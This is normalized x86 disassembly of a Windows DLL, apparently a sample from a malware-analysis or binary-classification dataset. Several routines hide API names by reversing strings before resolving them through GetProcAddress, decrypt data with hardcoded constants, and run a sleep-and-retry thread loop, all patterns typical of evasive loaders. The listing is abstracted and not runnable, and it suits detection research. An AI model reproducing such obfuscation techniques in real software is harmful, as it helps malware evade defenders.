sub ecx eax
push ecx
lea eax [ ebp - 0x1004 ]
push eax
call [ rw-data ]
lea eax [ ebp + eax * 2 - 0x1004 ]
push eax
push 0x0
push ebx
call [ ebp - 0x123c ]
push ebx
call [ rw-data ]
push rw-data
lea eax [ ebp - 0x1004 ]
push eax
call [ rw-data ]
jmp r-xdata
mov ebx rw-data
lea eax [ ebp - 0x1004 ]
push eax
call [ rw-data ]
mov ecx [ ebp - 0x1238 ]
add eax eax
push eax
lea edx [ ebp - 0x1004 ]
call sub_10002c6b
pop ecx
lea eax [ ebp - 0x1230 ]
push eax
push edi
call [ ebp - 0x1234 ]
test eax eax
jne r-xdata
sub_10002356
push ebx
push esi
push edi
mov esi rw-data
push esi
call sub_10002df0
mov ebx [ GetProcAddress@IAT ]
pop ecx
push esi
push [ rw-data ]
call ebx
call eax
push esi
mov [ rw-data ] eax
call sub_10002df0
mov esi rw-data
push esi
call sub_10002df0
pop ecx
pop ecx
push esi
push [ rw-data ]
call ebx
push esi
mov [ rw-data ] eax
call sub_10002df0
mov esi rw-data
push esi
call sub_10002df0
pop ecx
pop ecx
push esi
push [ rw-data ]
call ebx
push esi
mov [ rw-data ] eax
call sub_10002df0
mov esi rw-data
push esi
call sub_10002df0
pop ecx
pop ecx
push esi
push [ rw-data ]
call ebx
push esi
mov [ rw-data ] eax
call sub_10002df0
mov esi rw-data
push esi
call sub_10002df0
pop ecx
pop ecx
push esi
push [ rw-data ]
call ebx
push esi
mov [ rw-data ] eax
call sub_10002df0
mov esi rw-data
push esi
call sub_10002df0
pop ecx
pop ecx
push esi
push [ rw-data ]
call ebx
push esi
mov [ rw-data ] eax
call sub_10002df0
mov esi rw-data
push esi
call sub_10002df0
pop ecx
pop ecx
push esi
push [ rw-data ]
call ebx
push esi
mov [ rw-data ] eax
call sub_10002df0
mov esi rw-data
push esi
call sub_10002df0
pop ecx
pop ecx
push esi
push [ rw-data ]
call ebx
push esi
mov [ rw-data ] eax
call sub_10002df0
mov esi rw-data
push esi
call sub_10002df0
pop ecx
pop ecx
push esi
push [ rw-data ]
call ebx
push esi
mov [ rw-data ] eax
call sub_10002df0
mov esi rw-data
push esi
call sub_10002df0
pop ecx
pop ecx
push esi
push [ rw-data ]
call ebx
push esi
mov [ rw-data ] eax
call sub_10002df0
mov esi rw-data
push esi
call sub_10002df0
pop ecx
pop ecx
push esi
push [ rw-data ]
call ebx
push esi
mov [ rw-data ] eax
call sub_10002df0
mov esi rw-data
push esi
call sub_10002df0
pop ecx
pop ecx
push esi
push [ rw-data ]
call ebx
push esi
mov [ rw-data ] eax
call sub_10002df0
mov esi rw-data
push esi
call sub_10002df0
mov edi [ LoadLibraryA@IAT ]
pop ecx
pop ecx
push esi
call edi
push rw-data
mov esi eax
call sub_10002df0
mov [ esp ] rw-data
call sub_10002df0
mov [ esp ] rw-data
push esi
call ebx
push rw-data
mov [ rw-data ] eax
call sub_10002df0
mov [ esp ] rw-data
call sub_10002df0
mov [ esp ] rw-data
push esi
call ebx
mov [ rw-data ] eax
push rw-data
call sub_10002df0
mov [ esp ] rw-data
call sub_10002df0
mov [ esp ] rw-data
push esi
call ebx
push rw-data
mov [ rw-data ] eax
call sub_10002df0
mov [ esp ] rw-data
call sub_10002df0
mov [ esp ] rw-data
push esi
call ebx
push rw-data
mov [ rw-data ] eax
call sub_10002df0
mov [ esp ] rw-data
call sub_10002df0
mov [ esp ] rw-data
push esi
call ebx
push rw-data
mov [ rw-data ] eax
call sub_10002df0
mov [ esp ] rw-data
call sub_10002df0
mov [ esp ] rw-data
push esi
call ebx
push rw-data
mov [ rw-data ] eax
call sub_10002df0
mov esi rw-data
push esi
call sub_10002df0
pop ecx
pop ecx
push esi
call edi
push rw-data
mov esi eax
call sub_10002df0
mov [ esp ] rw-data
call sub_10002df0
mov [ esp ] rw-data
push esi
call ebx
push rw-data
mov [ rw-data ] eax
call sub_10002df0
mov [ esp ] rw-data
call sub_10002df0
mov [ esp ] rw-data
push esi
call ebx
push rw-data
mov [ rw-data ] eax
call sub_10002df0
mov esi rw-data
push esi
call sub_10002df0
pop ecx
pop ecx
push esi
call edi
push rw-data
mov esi eax
call sub_10002df0
mov [ esp ] rw-data
call sub_10002df0
mov [ esp ] rw-data
push esi
call ebx
push rw-data
mov [ rw-data ] eax
call sub_10002df0
mov [ esp ] rw-data
call sub_10002df0
mov [ esp ] rw-data
push esi
call ebx
push rw-data
mov [ rw-data ] eax
call sub_10002df0
mov [ esp ] rw-data
call sub_10002df0
mov [ esp ] rw-data
push esi
call ebx
push rw-data
mov [ rw-data ] eax
call sub_10002df0
mov esi rw-data
push esi
call sub_10002df0
pop ecx
pop ecx
push esi
call edi
push rw-data
mov esi eax
call sub_10002df0
mov [ esp ] rw-data
call sub_10002df0
mov [ esp ] rw-data
push esi
call ebx
push rw-data
mov [ rw-data ] eax
call sub_10002df0
mov [ esp ] rw-data
call sub_10002df0
mov [ esp ] rw-data
push esi
call ebx
push rw-data
mov [ rw-data ] eax
call sub_10002df0
mov [ esp ] rw-data
call sub_10002df0
mov [ esp ] rw-data
push esi
call ebx
push rw-data
mov [ rw-data ] eax
call sub_10002df0
mov [ esp ] rw-data
call sub_10002df0
mov [ esp ] rw-data
push esi
call ebx
push rw-data
mov [ rw-data ] eax
call sub_10002df0
mov [ esp ] rw-data
call sub_10002df0
mov [ esp ] rw-data
push esi
call ebx
push rw-data
mov [ rw-data ] eax
call sub_10002df0
mov [ esp ] rw-data
call sub_10002df0
mov [ esp ] rw-data
push esi
call ebx
push rw-data
mov [ rw-data ] eax
call sub_10002df0
mov [ esp ] rw-data
call sub_10002df0
mov [ esp ] rw-data
push esi
call ebx
push rw-data
mov [ rw-data ] eax
call sub_10002df0
mov [ esp ] rw-data
call sub_10002df0
mov [ esp ] rw-data
push esi
call ebx
push rw-data
mov [ rw-data ] eax
call sub_10002df0
mov [ esp ] rw-data
call sub_10002df0
mov [ esp ] rw-data
push esi
call ebx
push rw-data
mov [ rw-data ] eax
call sub_10002df0
mov [ esp ] rw-data
call sub_10002df0
mov [ esp ] rw-data
push esi
call ebx
push rw-data
mov [ rw-data ] eax
call sub_10002df0
mov [ esp ] rw-data
call sub_10002df0
mov esi rw-data
push esi
call sub_10002df0
pop ecx
pop ecx
push esi
push rw-data
call edi
push eax
call ebx
push rw-data
mov [ rw-data ] eax
call sub_10002df0
push esi
call sub_10002df0
push rw-data
call sub_10002df0
mov esi rw-data
push esi
call sub_10002df0
add esp 0x10
push esi
push rw-data
call edi
push eax
call ebx
push rw-data
mov [ rw-data ] eax
call sub_10002df0
push esi
call sub_10002df0
mov esi rw-data
push esi
call sub_10002df0
add esp 0xc
push esi
push [ rw-data ]
call ebx
push esi
mov [ rw-data ] eax
call sub_10002df0
mov esi rw-data
push esi
call sub_10002df0
pop ecx
pop ecx
push esi
push [ rw-data ]
call ebx
push esi
mov [ rw-data ] eax
call sub_10002df0
mov esi rw-data
push esi
call sub_10002df0
pop ecx
pop ecx
push esi
push [ rw-data ]
call ebx
push esi
mov [ rw-data ] eax
call sub_10002df0
pop ecx
pop edi
pop esi
pop ebx
retn
sub_10002945
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
call sub_10002356
mov edi rw-data
push edi
call sub_10002df0
mov esi [ GetProcAddress@IAT ]
pop ecx
push 0x1
push edi
push [ rw-data ]
call esi
call eax
push edi
call sub_10002df0
mov edi rw-data
push edi
call sub_10002df0
pop ecx
pop ecx
push edi
push [ rw-data ]
call esi
call eax
push edi
mov ebx eax
call sub_10002df0
pop ecx
mov edi 0x104
push edi
push 0x8
push [ rw-data ]
call [ rw-data ]
mov [ ebp - 0x8 ] edi
mov edi rw-data
push edi
mov [ rw-data ] eax
call sub_10002df0
pop ecx
lea eax [ ebp - 0x8 ]
push eax
push [ rw-data ]
push edi
push [ rw-data ]
call esi
call eax
push edi
call sub_10002df0
pop ecx
mov eax ebx
shr eax 0x8
movzx eax al
push eax
movzx eax bl
push eax
movzx eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
push rw-data
push [ rw-data ]
call [ rw-data ]
add eax [ rw-data ]
push eax
call [ rw-data ]
mov eax [ rw-data ]
add esp 0x18
xor ebx ebx
mov [ eax + 0x24 ] bl
lea eax [ ebp - 0xc ]
push eax
push ebx
push ebx
push sub_10001e8a
push ebx
push ebx
call [ rw-data ]
push 0x1388
mov edi eax
call [ rw-data ]
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x18 ] ebx
push esi
push ebx
push [ rw-data ]
call [ rw-data ]
mov eax ebx
jmp r-xdata
push 0xffffffff
push edi
call [ rw-data ]
mov ecx [ rw-data ]
call sub_10002cf4
mov ecx [ ebp - 0x4 ]
pop edi
xor eax eax
pop esi
xor ecx ebp
inc eax
pop ebx
call sub_10002de0
leave
retn 0x4
push 0x493e0
mov [ ebp - 0x10 ] ebx
call [ rw-data ]
jmp r-xdata
lea ecx [ ebp - 0x14 ]
push ecx
lea ecx [ ebp - 0x18 ]
push ecx
push 0x1
mov edx eax
mov ecx esi
call sub_10002d08
test eax eax
jne r-xdata
lea ecx [ ebp - 0x10 ]
call sub_100020ec
mov esi [ ebp - 0x10 ]
test esi esi
jne r-xdata
sub_10002ac8
push ebp
mov ebp esp
sub esp 0x20
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
xor esi esi
push esi
push esi
push esi
lea eax [ ebp - 0x20 ]
push eax
call [ rw-data ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_10002de0
leave
retn
push edi
mov edi rw-data
pop edi
cmp [ ebp - 0x1c ] 0x16
jne r-xdata
lea eax [ ebp - 0x20 ]
push eax
call [ rw-data ]
lea eax [ ebp - 0x20 ]
push eax
call [ rw-data ]
push esi
push esi
push esi
lea eax [ ebp - 0x20 ]
push eax
call [ rw-data ]
test eax eax
jne r-xdata
push edi
call sub_10002df0
pop ecx
push 0x1
push [ rw-data ]
push edi
push [ rw-data ]
call [ GetProcAddress@IAT ]
call eax
push edi
call sub_10002df0
pop ecx
cmp eax 0xffffffff
je r-xdata
sub_10002b76
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
dec [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov [ ebp - 0xc ] 0x557f9e46
mov [ ebp - 0x8 ] 0x476a4d8
mov [ ebp - 0x14 ] 0x359f48de
mov [ ebp - 0x10 ] 0x4c76f533
jne r-xdata
mov ecx [ ebp - 0x4 ]
xor eax eax
xor ecx ebp
inc eax
call sub_10002de0
leave
retn 0xc
push esi
push edi
lea eax [ ebp - 0xc ]
push eax
push ecx
mov esi rw-data
mov edx 0x3ab
mov ecx esi
call sub_10001000
lea eax [ ebp - 0x14 ]
push eax
push ecx
mov edx 0x179
mov ecx rw-data
call sub_10001000
push esi
call sub_10002df0
pop ecx
push esi
call [ LoadLibraryA@IAT ]
push esi
mov [ rw-data ] eax
call sub_10002df0
mov edi rw-data
push edi
call sub_10002df0
mov esi [ GetProcAddress@IAT ]
pop ecx
pop ecx
push edi
push [ rw-data ]
call esi
push edi
mov [ rw-data ] eax
call sub_10002df0
mov edi rw-data
push edi
call sub_10002df0
pop ecx
pop ecx
push edi
push [ rw-data ]
call esi
push edi
mov [ rw-data ] eax
call sub_10002df0
pop ecx
xor eax eax
push eax
push eax
push eax
push sub_10002945
push eax
push eax
call [ rw-data ]
pop edi
mov [ rw-data ] eax
pop esi
sub_10002c6b
push ebp
mov ebp esp
sub esp 0xc
mov eax ecx
push ebx
push esi
mov esi [ eax ]
mov [ ebp - 0xc ] eax
xor eax eax
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
test edx edx
je r-xdata
xor eax eax
test esi esi
jne r-xdata
push esi
push eax
push [ rw-data ]
call [ rw-data ]
mov ebx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
lea ecx [ eax + ebx ]
push ecx
push esi
push 0x8
push [ rw-data ]
call [ rw-data ]
mov ebx [ ebp + 0x8 ]
push ebx
push 0x8
push [ rw-data ]
call [ rw-data ]
jmp r-xdata
mov esi [ ebp - 0x4 ]
push ebx
push [ ebp - 0x8 ]
add esi edi
push esi
call [ rw-data ]
add esp 0xc
cmp eax esi
jne r-xdata
or eax 0xffffffff
jmp r-xdata
mov edi eax
test edi edi
jne r-xdata
mov eax [ ebp - 0xc ]
mov [ eax ] edi
pop edi
pop esi
pop ebx
leave
retn
sub_10002d08
push ebp
mov ebp esp
push ecx
push ecx
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
push esi
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0x8 ]
call sub_1000125d
mov esi eax
test esi esi
je r-xdata
mov ecx [ ebp - 0x4 ]
call sub_10002cf4
mov eax esi
pop esi
leave
retn 0xc
push [ ebp + 0x10 ]
mov edx [ ebp - 0x4 ]
push [ ebp + 0xc ]
mov ecx rw-data
push [ ebp - 0x8 ]
call sub_10002d71
test eax eax
jne r-xdata
push [ ebp + 0x10 ]
mov edx [ ebp - 0x4 ]
push [ ebp + 0xc ]
mov ecx rw-data
push [ ebp - 0x8 ]
call sub_10002d71
neg eax
sbb eax eax
and esi eax
sub_10002d71
push ebp
mov ebp esp
push ebx
push esi
push edi
push 0x8
push 0x8
push [ rw-data ]
mov ebx edx
mov edi ecx
call [ rw-data ]
mov esi eax
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
push edi
mov ecx esi
call sub_10001eb9
test eax eax
jne r-xdata
push [ ebp + 0x10 ]
mov ecx esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push ebx
call sub_10001f28
cmp [ esi + 0x4 ] 0x0
mov edi eax
je r-xdata
xor edi edi
jmp r-xdata
cmp [ esi ] 0x0
je r-xdata
push [ esi + 0x4 ]
call [ rw-data ]
mov ecx esi
call sub_10002cf4
mov eax edi
push [ esi ]
call [ rw-data ]
sub_10002df0
push ebp
mov ebp esp
push edi
push esi
mov edi [ ebp + 0x8 ]
mov edx edi
mov esi edi
xor eax eax
or ecx 0xffffffff
[ edi ]
cmp ecx 0xfffffffe
je r-xdata
mov eax edx
pop esi
pop edi
leave
retn
sub edi 0x2
mov ah [ esi ]
mov al [ edi ]
mov [ esi ] al
mov [ edi ] ah
add esi 0x1
sub edi 0x1
jmp r-xdata
cmp esi edi
jae r-xdata
sub_10002e25
push 0x8
push r--data
call sub_10004750
mov eax [ ebp + 0xc ]
cmp eax 0x1
jne r-xdata
test eax eax
jne r-xdata
call sub_10003bb2
test eax eax
jne r-xdata
cmp eax 0x2
jne r-xdata
mov eax [ rw-data ]
test eax eax
jle r-xdata
call sub_100034ca
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
cmp eax 0x3
jne r-xdata
push [ rw-data ]
call sub_1000433f
pop ecx
test eax eax
jne r-xdata
dec eax
mov [ rw-data ] eax
and [ ebp - 0x4 ] 0x0
cmp [ rw-data ] 0x0
jne r-xdata
call sub_10004707
call [ GetCommandLineA@IAT ]
mov [ rw-data ] eax
call sub_10004277
mov [ rw-data ] eax
call sub_10003bcf
test eax eax
jns r-xdata
call sub_10003bc7
jmp r-xdata
call sub_10004795
retn 0xc
xor eax eax
inc eax
push 0x0
call sub_1000335a
pop ecx
push 0x3bc
push 0x1
call sub_10004628
pop ecx
pop ecx
mov esi eax
test esi esi
je r-xdata
call sub_1000381b
mov esi [ ebp + 0x10 ]
test esi esi
jne r-xdata
call sub_10003947
call sub_10003ecf
test eax eax
js r-xdata
call sub_10003540
jmp r-xdata
push esi
push [ rw-data ]
call sub_1000435e
pop ecx
pop ecx
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10002f07
jmp r-xdata
call sub_10003e7d
call sub_10003540
call sub_10003bc7
call sub_10003e7d
jmp r-xdata
call sub_100040fc
test eax eax
js r-xdata
push esi
call sub_10003622
pop ecx
jmp r-xdata
push 0x0
push esi
call sub_10003417
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
mov [ esi ] eax
or [ esi + 0x4 ] 0xffffffff
jmp r-xdata
push 0x0
call sub_10003956
pop ecx
test eax eax
jne r-xdata
inc [ rw-data ]
jmp r-xdata
sub_10002fba
push 0xc
push r--data
call sub_10004750
xor eax eax
inc eax
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
and [ ebp - 0x4 ] 0x0
cmp esi 0x1
je r-xdata
cmp [ rw-data ] esi
je r-xdata
mov ecx [ r--data ]
test ecx ecx
je r-xdata
cmp esi 0x2
jne r-xdata
xor eax eax
test eax eax
je r-xdata
push [ ebp + 0x10 ]
push esi
push [ ebp + 0x8 ]
call ecx
mov [ ebp - 0x1c ] eax
mov ebx [ ebp + 0x10 ]
push ebx
push esi
push [ ebp + 0x8 ]
call sub_10002b76
mov edi eax
mov [ ebp - 0x1c ] edi
cmp esi 0x1
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
push [ ebp + 0x10 ]
push esi
push [ ebp + 0x8 ]
call sub_10002e25
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
test esi esi
je r-xdata
test edi edi
jne r-xdata
push ebx
push esi
push [ ebp + 0x8 ]
call sub_10002e25
neg eax
sbb eax eax
and edi eax
mov [ ebp - 0x1c ] edi
je r-xdata
cmp esi 0x3
jne r-xdata
push ebx
push eax
push [ ebp + 0x8 ]
call sub_10002b76
push ebx
push edi
push [ ebp + 0x8 ]
call sub_10002e25
mov eax [ r--data ]
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov eax edi
jmp r-xdata
mov eax [ r--data ]
test eax eax
je r-xdata
push ebx
push edi
push [ ebp + 0x8 ]
call eax
call sub_10004795
retn
push ebx
push esi
push [ ebp + 0x8 ]
call eax
mov edi eax
mov [ ebp - 0x1c ] edi
sub_100030c8
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x1
jne r-xdata
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
call sub_100037b5
pop ecx
pop ecx
pop ebp
retn
push [ ebp + 0x10 ]
push 0x0
push [ ebp + 0x8 ]
call sub_10002e25
sub_100030ed
push ebp
mov ebp esp
call [ IsDebuggerPresent@IAT ]
push 0x1
mov [ rw-data ] eax
call sub_10004945
push [ ebp + 0x8 ]
call sub_10004612
cmp [ rw-data ] 0x0
pop ecx
pop ecx
jne r-xdata
push 0xc0000409
call sub_100045fd
pop ecx
pop ebp
retn
push 0x1
call sub_10004945
pop ecx
sub_1000312a
push ebp
mov ebp esp
sub esp 0x324
push 0x17
call IsProcessorFeaturePresent
test eax eax
je r-xdata
mov [ rw-data ] eax
mov [ rw-data ] ecx
mov [ rw-data ] edx
mov [ rw-data ] ebx
mov [ rw-data ] esi
mov [ rw-data ] edi
mov [ rw-data ] ss
mov [ rw-data ] cs
mov [ rw-data ] ds
mov [ rw-data ] es
mov [ rw-data ] fs
mov [ rw-data ] gs
pushfd
pop [ rw-data ]
mov eax [ ebp ]
mov [ rw-data ] eax
mov eax [ ebp + 0x4 ]
mov [ rw-data ] eax
lea eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x324 ]
mov [ rw-data ] 0x10001
mov eax [ rw-data ]
mov [ rw-data ] eax
mov [ rw-data ] 0xc0000409
mov [ rw-data ] 0x1
mov [ rw-data ] 0x1
push 0x4
pop eax
imul eax eax 0x0
mov [ eax + rw-data ] 0x2
push 0x4
pop eax
imul eax eax 0x0
mov ecx [ rw-data ]
mov [ ebp + eax - 0x8 ] ecx
push 0x4
pop eax
shl eax 0x0
mov ecx [ rw-data ]
mov [ ebp + eax - 0x8 ] ecx
push r--data
call sub_100030ed
leave
retn
push 0x2
pop ecx
int 0x29
sub_10003223
push 0x8
push r--data
call sub_10004750
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_10004795
retn 0x4
cmp [ esi + 0x24 ] 0x0
je r-xdata
cmp [ esi + 0x2c ] 0x0
je r-xdata
push [ esi + 0x24 ]
call sub_10003622
pop ecx
cmp [ esi + 0x34 ] 0x0
je r-xdata
push [ esi + 0x2c ]
call sub_10003622
pop ecx
cmp [ esi + 0x3c ] 0x0
je r-xdata
push [ esi + 0x34 ]
call sub_10003622
pop ecx
cmp [ esi + 0x40 ] 0x0
je r-xdata
push [ esi + 0x3c ]
call sub_10003622
pop ecx
cmp [ esi + 0x44 ] 0x0
je r-xdata
push [ esi + 0x40 ]
call sub_10003622
pop ecx
cmp [ esi + 0x48 ] 0x0
je r-xdata
push [ esi + 0x44 ]
call sub_10003622
pop ecx
cmp [ esi + 0x5c ] r--data
je r-xdata
push [ esi + 0x48 ]
call sub_10003622
pop ecx
push 0xd
call sub_1000494d
pop ecx
and [ ebp - 0x4 ] 0x0
mov edi [ esi + 0x68 ]
test edi edi
je r-xdata
push [ esi + 0x5c ]
call sub_10003622
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10003345
push 0xc
call sub_1000494d
pop ecx
mov [ ebp - 0x4 ] 0x1
mov edi [ esi + 0x6c ]
test edi edi
je r-xdata
push edi
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10003351
push esi
call sub_10003622
pop ecx
push edi
call sub_10004cb0
pop ecx
cmp edi [ rw-data ]
je r-xdata
cmp edi rw-data
je r-xdata
cmp edi rw-data
je r-xdata
push edi
call sub_10003622
pop ecx
cmp [ edi ] 0x0
jne r-xdata
push edi
call sub_10004b56
pop ecx
sub_1000335a
push ebp
mov ebp esp
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
pop ebp
retn
push esi
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
push 0x0
push eax
call sub_1000435e
pop ecx
pop ecx
push esi
call sub_10003223
pop esi
push eax
call sub_1000433f
mov esi eax
mov eax [ rw-data ]
pop ecx
sub_100033a8
push esi
push edi
call [ GetLastError@IAT ]
push [ rw-data ]
mov edi eax
call sub_1000433f
mov esi eax
pop ecx
test esi esi
jne r-xdata
push edi
call [ SetLastError@IAT ]
pop edi
mov eax esi
pop esi
retn
push 0x3bc
push 0x1
call sub_10004628
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push esi
push [ rw-data ]
call sub_1000435e
pop ecx
pop ecx
test eax eax
je r-xdata
push esi
call sub_10003622
pop ecx
xor esi esi
push 0x0
push esi
call sub_10003417
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
jmp r-xdata
sub_10003417
push 0x8
push r--data
call sub_10004750
mov esi [ ebp + 0x8 ]
mov [ esi + 0x5c ] r--data
and [ esi + 0x8 ] 0x0
xor edi edi
inc edi
mov [ esi + 0x14 ] edi
mov [ esi + 0x70 ] edi
push 0x43
pop eax
mov [ esi + 0xb8 ] ax
mov [ esi + 0x1be ] ax
mov [ esi + 0x68 ] rw-data
and [ esi + 0x3b8 ] 0x0
push 0xd
call sub_1000494d
pop ecx
and [ ebp - 0x4 ] 0x0
push [ esi + 0x68 ]
call [ InterlockedIncrement@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_100034b8
push 0xc
call sub_1000494d
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebp + 0xc ]
mov [ esi + 0x6c ] eax
test eax eax
jne r-xdata
push [ esi + 0x6c ]
call sub_10004ac6
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_100034c1
call sub_10004795
retn
mov eax [ rw-data ]
mov [ esi + 0x6c ] eax
sub_100034ca
call sub_100039fb
call sub_10004a7c
test eax eax
jne r-xdata
push sub_10003223
call sub_10004302
pop ecx
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
call sub_10003540
xor eax eax
retn
push esi
push 0x3bc
push 0x1
call sub_10004628
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
call sub_10003540
xor eax eax
pop esi
retn
push esi
push [ rw-data ]
call sub_1000435e
pop ecx
pop ecx
test eax eax
je r-xdata
push 0x0
push esi
call sub_10003417
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
xor eax eax
inc eax
pop esi
retn
sub_1000355d
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
cmp esi 0xffffffe0
ja r-xdata
push esi
call sub_100035ef
pop ecx
call sub_100057e9
mov [ eax ] 0xc
xor eax eax
push ebx
push edi
test esi esi
je r-xdata
call sub_1000559d
push 0x1e
call sub_100055fa
push 0xff
call sub_10003805
xor ecx ecx
inc ecx
mov ecx esi
jmp r-xdata
mov eax edi
pop edi
pop ebx
jmp r-xdata
push 0xc
pop ebx
cmp [ rw-data ] eax
je r-xdata
push ecx
push 0x0
push eax
call [ HeapAlloc@IAT ]
mov edi eax
test edi edi
jne r-xdata
pop esi
pop ebp
retn
call sub_100057e9
mov [ eax ] ebx
push esi
call sub_100035ef
pop ecx
test eax eax
jne r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
jmp r-xdata
call sub_100057e9
mov [ eax ] ebx
sub_100035ef
push ebp
mov ebp esp
push [ rw-data ]
call [ DecodePointer@IAT ]
test eax eax
je r-xdata
xor eax eax
pop ebp
retn
push [ ebp + 0x8 ]
call eax
pop ecx
test eax eax
je r-xdata
xor eax eax
inc eax
pop ebp
retn
sub_10003622
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
pop ebp
retn
push [ ebp + 0x8 ]
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
test eax eax
jne r-xdata
push esi
call sub_100057e9
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_100057fc
pop ecx
mov [ esi ] eax
pop esi
sub_1000365a
push ebp
mov ebp esp
push esi
call sub_100033a8
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov edx [ esi + 0x5c ]
push edi
mov edi [ ebp + 0x8 ]
mov ecx edx
lea eax [ edx + 0x90 ]
cmp ecx eax
jae r-xdata
add ecx 0xc
lea eax [ edx + 0x90 ]
cmp ecx eax
jb r-xdata
xor ecx ecx
cmp [ ecx ] edi
je r-xdata
cmp [ ecx ] edi
je r-xdata
xor eax eax
mov edx [ ecx + 0x8 ]
test edx edx
je r-xdata
test ecx ecx
je r-xdata
cmp edx 0x5
jne r-xdata
cmp edx 0x1
jne r-xdata
and [ ecx + 0x8 ] 0x0
xor eax eax
inc eax
jmp r-xdata
mov eax [ ebp + 0xc ]
push ebx
mov ebx [ esi + 0x60 ]
mov [ esi + 0x60 ] eax
cmp [ ecx + 0x4 ] 0x8
jne r-xdata
or eax 0xffffffff
jmp r-xdata
pop edi
push [ ecx + 0x4 ]
and [ ecx + 0x8 ] 0x0
call edx
push 0x24
pop edi
mov eax [ esi + 0x5c ]
add edi 0xc
and [ edi + eax - 0x4 ] 0x0
cmp edi 0x90
jl r-xdata
cmp [ ecx ] 0xc000008e
mov edi [ esi + 0x64 ]
jne r-xdata
cmp [ ecx ] 0xc0000090
jne r-xdata
mov [ esi + 0x64 ] 0x83
jmp r-xdata
cmp [ ecx ] 0xc0000091
jne r-xdata
mov [ esi + 0x64 ] 0x81
jmp r-xdata
push [ esi + 0x64 ]
push 0x8
call edx
pop ecx
mov [ esi + 0x64 ] edi
jmp r-xdata
cmp [ ecx ] 0xc0000093
jne r-xdata
mov [ esi + 0x64 ] 0x84
jmp r-xdata
pop ecx
mov [ esi + 0x60 ] ebx
or eax 0xffffffff
pop ebx
jmp r-xdata
cmp [ ecx ] 0xc000008d
jne r-xdata
mov [ esi + 0x64 ] 0x85
jmp r-xdata
cmp [ ecx ] 0xc000008f
jne r-xdata
mov [ esi + 0x64 ] 0x82
jmp r-xdata
cmp [ ecx ] 0xc0000092
jne r-xdata
mov [ esi + 0x64 ] 0x86
jmp r-xdata
cmp [ ecx ] 0xc00002b5
jne r-xdata
mov [ esi + 0x64 ] 0x8a
jmp r-xdata
cmp [ ecx ] 0xc00002b4
jne r-xdata
mov [ esi + 0x64 ] 0x8d
jmp r-xdata
mov [ esi + 0x64 ] 0x8e
sub_100037b5
push ebp
mov ebp esp
mov eax 0xe06d7363
cmp [ ebp + 0x8 ] eax
jne r-xdata
xor eax eax
pop ebp
retn
push [ ebp + 0xc ]
push eax
call sub_1000365a
pop ecx
pop ecx
pop ebp
retn
sub_100037d3
push ebp
mov ebp esp
push ecx
lea eax [ ebp - 0x4 ]
push eax
push r--data
push 0x0
call [ GetModuleHandleExW@IAT ]
test eax eax
je r-xdata
leave
retn
push r--data
push [ ebp - 0x4 ]
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call eax
sub_1000381b
push esi
push edi
push [ rw-data ]
call [ DecodePointer@IAT ]
mov esi [ rw-data ]
mov edi eax
test esi esi
je r-xdata
push ebx
push esi
call sub_10003622
mov esi [ rw-data ]
xor ebx ebx
pop ecx
mov [ rw-data ] ebx
test esi esi
je r-xdata
cmp [ esi ] 0x0
je r-xdata
push esi
call sub_10003622
push [ rw-data ]
mov [ rw-data ] ebx
call sub_10003622
push [ rw-data ]
call sub_10003622
add esp 0xc
mov [ rw-data ] ebx
mov [ rw-data ] ebx
cmp edi 0xffffffff
je r-xdata
cmp [ esi ] ebx
je r-xdata
mov esi [ rw-data ]
push [ esi ]
call sub_10003622
pop ecx
add esi 0x4
jne r-xdata
